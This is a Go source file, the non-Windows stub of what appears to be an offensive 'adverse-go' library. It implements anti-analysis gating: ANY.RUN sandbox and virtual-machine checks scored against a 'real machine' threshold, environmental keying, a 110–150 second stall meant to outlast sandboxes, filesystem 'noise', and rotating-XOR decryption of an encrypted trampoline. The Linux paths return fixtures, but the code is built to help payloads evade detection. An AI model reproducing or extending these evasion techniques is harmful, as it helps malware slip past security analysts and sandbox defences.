//go:build !windows

package behavioural

import (
	"context"
	"crypto/sha256"
	"os"
	"path/filepath"
	"time"

	"github.com/ashwnn/adverse-go/internal/anti"
)

// PlatformGate on non-Windows (Linux CI) emits synthetic signals that are
// deterministic and test-friendly. On Windows, PlatformGate() performs
// hardware/firmware/process checks.
// When not in sandbox mode it emits enough real_* positive signals to exceed
// RealMachineThreshold, so Allow() can return Allowed=true on a real host.
func PlatformGate() []anti.CheckResult {
	var out []anti.CheckResult
	// On Linux, mimic a "real desktop" by default unless BEHAVIOURAL_SANDBOX is set.
	if os.Getenv("BEHAVIOURAL_SANDBOX") == "1" {
		out = append(out, anti.CheckResult{Name: "anyrun_artifact", Triggered: true, Detail: "BEHAVIOURAL_SANDBOX=1"})
		out = append(out, anti.CheckResult{Name: "anyrun_uptime", Triggered: true, Detail: "simulated low uptime"})
		out = append(out, anti.CheckResult{Name: "anyrun_specs", Triggered: false, Detail: "linux: no WMI specs"})
		out = append(out, anti.CheckResult{Name: "anyrun_processes", Triggered: false, Detail: "linux: process count n/a"})
		out = append(out, anti.CheckResult{Name: "anyrun_idle", Triggered: false, Detail: "linux: no last-input"})
		return out
	}
	// Clean Linux host — emit negative checks as not triggered and provide
	// complementary real_* positives so scoreGate can pass.
	out = append(out, anti.CheckResult{Name: "anyrun_specs", Triggered: false, Detail: "linux: no WMI specs"})
	out = append(out, anti.CheckResult{Name: "anyrun_processes", Triggered: false, Detail: "linux: process count n/a"})
	out = append(out, anti.CheckResult{Name: "anyrun_idle", Triggered: false, Detail: "linux: no last-input"})
	out = append(out, anti.CheckResult{Name: "anyrun_uptime", Triggered: false, Detail: "linux uptime OK"})
	out = append(out, anti.CheckResult{Name: "vm_smbios", Triggered: false, Detail: "linux: SMBIOS clean (fixture)"})
	out = append(out, anti.CheckResult{Name: "vm_gpu", Triggered: false, Detail: "linux: GPU clean (fixture)"})
	out = append(out, anti.CheckResult{Name: "vm_no_battery", Triggered: false, Detail: "linux: battery fixture"})
	out = append(out, anti.CheckResult{Name: "vm_no_audio", Triggered: false, Detail: "linux: audio present (fixture)"})
	out = append(out, anti.CheckResult{Name: "vm_no_sensors", Triggered: false, Detail: "linux: sensors present (fixture)"})
	out = append(out, anti.CheckResult{Name: "vm_low_resolution", Triggered: false, Detail: "linux: resolution 1920x1080 (fixture)"})
	out = append(out, anti.CheckResult{Name: "vm_few_apps", Triggered: false, Detail: "linux: 80 apps (fixture)"})
	out = append(out, anti.CheckResult{Name: "vm_few_user_files", Triggered: false, Detail: "linux: 120 user files (fixture)"})
	// Positive real-machine indicators — sum = 8+5+5+5+5+3+10+8+8+5 = 62 > threshold 20.
	out = append(out, anti.CheckResult{Name: "real_smbios", Triggered: true, Detail: "linux: OEM fixture"})
	out = append(out, anti.CheckResult{Name: "real_gpu", Triggered: true, Detail: "linux: GPU fixture"})
	out = append(out, anti.CheckResult{Name: "real_battery", Triggered: true, Detail: "linux: battery fixture"})
	out = append(out, anti.CheckResult{Name: "real_audio", Triggered: true, Detail: "linux: audio fixture"})
	out = append(out, anti.CheckResult{Name: "real_sensors", Triggered: true, Detail: "linux: sensors fixture"})
	out = append(out, anti.CheckResult{Name: "real_resolution", Triggered: true, Detail: "linux: 1920x1080"})
	out = append(out, anti.CheckResult{Name: "real_apps", Triggered: true, Detail: "linux: 80 apps"})
	out = append(out, anti.CheckResult{Name: "real_user_files", Triggered: true, Detail: "linux: 120 files"})
	out = append(out, anti.CheckResult{Name: "real_uptime", Triggered: true, Detail: "linux: uptime 7200s (fixture)"})
	out = append(out, anti.CheckResult{Name: "real_processes", Triggered: true, Detail: "linux: 60 processes (fixture)"})
	return out
}

func platformEnvMaterial() []byte {
	// Deterministic fixture for Linux tests; Windows uses MachineGuid+CSI.
	// Seed from env or fixed fixture — cross-test determinism required.
	raw := []byte("linux-fixture-env-key")
	if v := os.Getenv("ADVERSE_ENV_SEED"); v != "" {
		raw = []byte(v)
	}
	// Mix in a stable host id so cross-test key is non-trivial.
	h := sha256.Sum256([]byte("behavioural-linux"))
	return append(raw, h[:]...)
}

// platformMimicBenignRegistryNoise performs benign local os.Stat calls on
// common user paths instead of a pure no-op, so the noise layer isn't
// entirely absent. Network-free and safe.
func platformMimicBenignRegistryNoise() {
	home := os.Getenv("HOME")
	if home == "" {
		home = "/tmp"
	}
	paths := []string{
		home,
		filepath.Join(home, "Documents"),
		filepath.Join(home, "Downloads"),
		filepath.Join(home, "Desktop"),
		filepath.Join(home, ".bashrc"),
		filepath.Join(home, ".profile"),
		"/etc/hostname",
		"/etc/passwd",
		"/proc/cpuinfo",
		"/proc/meminfo",
	}
	for i := 0; i < 20; i++ {
		p := paths[i%len(paths)]
		_, _ = os.Stat(p)
	}
}

// delayedWorkPlatform falls back to a goroutine-based delay on non-Windows.
// This preserves the same API but uses a simple time.After + fn() call.
func delayedWorkPlatform(ctx context.Context, minSeconds int, fn func()) {
	if minSeconds < 110 {
		minSeconds = 110
	}
	if minSeconds > 150 {
		minSeconds = 150
	}
	delay := time.Duration(minSeconds) * time.Second
	go func() {
		select {
		case <-ctx.Done():
			return
		case <-time.After(delay):
		}
		fn()
	}()
	// Stall the calling goroutine so the caller sees the delay.
	StallBeyondSandbox(ctx, minSeconds)
}

// armEncryptedTrampolinePlatform is a no-op on non-Windows. It decrypts
// via RotatingXOR using the env key but does not register a VEH.
func armEncryptedTrampolinePlatform(enc []byte) (plain []byte, done func()) {
	key := EnvironmentalKey()
	plain = RotatingXOR(enc, key[0])
	return plain, func() {}
}
